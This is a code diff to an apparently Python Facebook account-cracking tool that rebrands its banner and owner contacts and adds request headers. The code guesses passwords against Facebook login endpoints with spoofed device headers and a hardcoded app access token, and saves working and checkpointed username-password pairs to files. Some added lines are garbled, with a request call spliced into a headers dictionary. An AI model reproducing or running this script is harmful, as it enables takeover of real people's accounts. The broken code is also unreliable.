@@ -322,7 +322,7 @@ def crack(idf,pwv):
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [KUSH-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [rona ni-cp] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
 				open('/sdcard-OK.txt','a').write('%s\n' % wrt)
@@ -353,7 +353,7 @@ def free(idf,pwv):
 			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				rint( f'\r\x1b[1;92m [KUSH-Ok] {idf} | {pw}')
+				rint( f'\r\x1b[1;92m [rona ni -cp] {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
@@ -394,21 +394,24 @@ logo = """\033[1;30m
                \033[1;39msᴜʙ \033[1;35mᴋᴀ \033[1;36mʙᴀᴀᴘ
 \033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
 \033[0;92m
- \033[1;31m██████╗██╗  ██╗ █████╗ ███╗   ██╗██████╗ 
-\033[1;32m██╔════╝██║  ██║██╔══██╗████╗  ██║██╔══██╗
-\033[1;33m██║     ███████║███████║██╔██╗ ██║██║  ██║
-\033[1;34m██║     ██╔══██║██╔══██║██║╚██╗██║██║  ██║
-\033[1;35m╚██████╗██║  ██║██║  ██║██║ ╚████║██████╔╝
- \033[1;31m╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ 
+ \033[1;31m████  ______   __       __  ______  _______  
+ /      \ /  \     /  |/      |/       \ 
+/$$$$$$  |$$  \   /$$ |$$$$$$/ $$$$$$$  |
+$$ |__$$ |$$$  \ /$$$ |  $$ |  $$ |__$$ |
+$$    $$ |$$$$  /$$$$ |  $$ |  $$    $$< 
+$$$$$$$$ |$$ $$ $$/$$ |  $$ |  $$$$$$$  |
+$$ |  $$ |$$ |$$$/ $$ | _$$ |_ $$ |  $$ |
+$$ |  $$ |$$ | $/  $$ |/ $$   |$$ |  $$ |
+$$/   $$/ $$/      $$/ $$$$$$/ $$/   $$/ 
 \033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
-\033[1;39m━▷ \033[0;91m𝙊𝙒𝙉𝙀𝙍    \033[1;39m◈✙◈\033[1;33m MR CHAND
-\033[1;39m━▷ \033[0;91m𝙏𝙀𝘼𝙈     \033[1;39m◈✙◈\033[1;31m TEAM OF ATF
-\033[1;39m━▷ \033[0;91m𝙔𝙊𝙐𝙏𝙐𝘽𝙀  \033[1;39m◈✙◈ \033[1;32mCHAND TRICKER
+\033[1;39m━▷ \033[0;91m𝙊𝙒𝙉𝙀𝙍    \033[1;39m◈✙◈\033[1;33m MR AMIR
+\033[1;39m━▷ \033[0;91m𝙏𝙀𝘼𝙈     \033[1;39m◈✙◈\033[1;31m TEAM OF AMIR
+\033[1;39m━▷ \033[0;91m𝙔𝙊𝙐𝙏𝙐𝘽𝙀  \033[1;39m◈✙◈ \033[1;32mAMIR TRICKER
 \033[1;39m━▷ \033[0;91m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 \033[1;39m◈✙◈ \033[1;33mBAAP.HUN.TERA.MERY.BACHY
 \033[1;39m━▷ \033[0;91m𝙁𝘽 𝙂𝙍𝙊𝙐𝙋 \033[1;39m◈✙◈ \033[1;34mFACEBOOK ZONE 🙂🙈
 \033[1;39m━▷ \033[0;91m𝙒𝙋 𝙂𝙍𝙊𝙐𝙋 \033[1;39m◈✙◈ \033[1;35mSTARTING EXIT SELECT AND JOIN
 \033[1;39m━▷ \033[0;91m𝙎𝘼𝙏𝙐𝙏𝘼𝙎  \033[1;39m◈✙◈ \033[0;92mFREE AND ENJOY
-\033[1;39m━▷ \033[0;91m𝙑𝙀𝙍𝙎𝙄𝙊𝙉  \033[1;39m◈✙◈ \033[1;31m2.0
+\033[1;39m━▷ \033[0;91m𝙑𝙀𝙍𝙎𝙄𝙊𝙉  \033[1;39m◈✙◈ \033[1;31m2.1
 \033[1;39m━▷ \033[1;36m𝙁𝙀𝙀𝙇 𝙏𝙃𝙀 𝙋𝙊𝙒𝙀𝙍 𝙊𝙁 AMIR 𝙊𝙒𝙉𝙀𝙍 𝙊𝙁 𝘼𝙏𝙁
 \033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●"""
  
@@ -425,7 +428,7 @@ class Main:
 		print("\033[1;37m     FIRST OF ALL REQUEST MY FACEBOOK ID")
 		print("\033[1;33m     ●▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[1;33m●▬▬▬▬▬▬▬▬▬▬▬▬●")
 		
-		print(" \033[1;39m━▷\033[1;32m [1] REQUESTTHE CHANNEL FOR APPROVED")
+		print(" \033[1;39m━▷\033[1;32m [1] REQUESTTHE MY FACEBOOK ID FOR APPROVED")
 		print(" \033[1;39m━▷\033[1;31m [2] Exit")
 		print("")
 		baloch = input("\n\033[1;37m  \033[1;35mChoice \033[1;37m━━> \033[1;32m")
@@ -433,10 +436,10 @@ class Main:
 			exit()
 		elif baloch in ["2", "02"]:
 			print("    CHAL BAGH 🤭")
-			os.system("xdg-open http://Wa.me/+923017787729")
+			os.system("xdg-open http://Wa.me/+923020906691")
 			exit()
 		elif baloch in ["1", "01"]:
-			os.system("xdg-open https://youtube.com/channel/UCPErGt_PlIcbobfyCwle9HA")
+			os.system("https://www.facebook.com/profile.php?id=100082256173620")
 			print("")
 			time.sleep(2.0)
 			print("\033[1;37m    Type Your Channel Name")
@@ -881,7 +884,22 @@ class Main:
 		for pw in pwx:
 			pw = pw.lower()
 			ses = requests.Session()
-			headers = {
+			headers = {'authority': 'mbasic.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'accept-language': 'en-IE,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+    'cache-control': 'max-age=0',
+    # 'cookie': 'datr=uxD7Y7djiqYFY1KrBbg7gFy5; sb=uxD7Y5KiJBmXsVLZ-hTiKPhE; locale=en_GB; vpd=v1%3B668x360x3; m_pixel_ratio=3; wd=360x668; fr=0Dqu3V3O2UGbc4rrD..Bj-xC7.P_.AAA.0.0.Bj_kcY.AWXtygo4T1o',
+    'referer': 'https://www.google.com/',
+    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'cross-site',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
+
 				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
 				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
 				"x-fb-net-hni": str(random.randint(20000, 40000)), 
@@ -890,7 +908,21 @@ class Main:
 				"user-agent": rua, 
 				"content-type": "application/x-www-form-urlencoded", 
 				"x-fb-http-engine": "Liger"
-			}
+			}response = requests.get('https://mbasic.facebo    'authority': 'mbasic.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'accept-language': 'en-IE,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+    'cache-control': 'max-age=0',
+    # 'cookie': 'datr=uxD7Y7djiqYFY1KrBbg7gFy5; sb=uxD7Y5KiJBmXsVLZ-hTiKPhE; locale=en_GB; vpd=v1%3B668x360x3; m_pixel_ratio=3; wd=360x668; fr=0Dqu3V3O2UGbc4rrD..Bj-xC7.P_.AAA.0.0.Bj_kcY.AWXtygo4T1o',
+    'referer': 'https://www.google.com/',
+    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'cross-site',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',ok.com/', cookies=cookies, headers=headers)
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAA" in response.text:
 				print("\r \033[0;92m[KUSH-OK ] %s | %s\033[0;97m         "%(uid, pw))
@@ -899,9 +931,9 @@ class Main:
 				open("2009-KUSH-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[KUSH-OK] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[rona ni -cp] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-KUSH-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-rona ni -cp.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1312,7 +1344,22 @@ class Main:
 		for pw in pwx:
 			pw = pw.lower()
 			ses = requests.Session()
-			headers = {
+			headers = {    'authority': 'mbasic.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'accept-language': 'en-IE,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+    'cache-control': 'max-age=0',
+    # 'cookie': 'datr=uxD7Y7djiqYFY1KrBbg7gFy5; sb=uxD7Y5KiJBmXsVLZ-hTiKPhE; locale=en_GB; vpd=v1%3B668x360x3; m_pixel_ratio=3; wd=360x668; fr=0Dqu3V3O2UGbc4rrD..Bj-xC7.P_.AAA.0.0.Bj_kcY.AWXtygo4T1o',
+    'referer': 'https://www.google.com/',
+    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'cross-site',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
+
 				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
 				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
 				"x-fb-net-hni": str(random.randint(20000, 40000)), 
@@ -1321,7 +1368,21 @@ class Main:
 				"user-agent": rua, 
 				"content-type": "application/x-www-form-urlencoded", 
 				"x-fb-http-engine": "Liger"
-			}
+			}response = requests.get('https://mbasic.facebo    'authority': 'mbasic.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'accept-language': 'en-IE,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+    'cache-control': 'max-age=0',
+    # 'cookie': 'datr=uxD7Y7djiqYFY1KrBbg7gFy5; sb=uxD7Y5KiJBmXsVLZ-hTiKPhE; locale=en_GB; vpd=v1%3B668x360x3; m_pixel_ratio=3; wd=360x668; fr=0Dqu3V3O2UGbc4rrD..Bj-xC7.P_.AAA.0.0.Bj_kcY.AWXtygo4T1o',
+    'referer': 'https://www.google.com/',
+    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'cross-site',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',ok.com/', cookies=cookies, headers=headers)
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
 				print("\r \033[0;92m[kush-OK ] %s | %s\033[0;97m         "%(uid, pw))
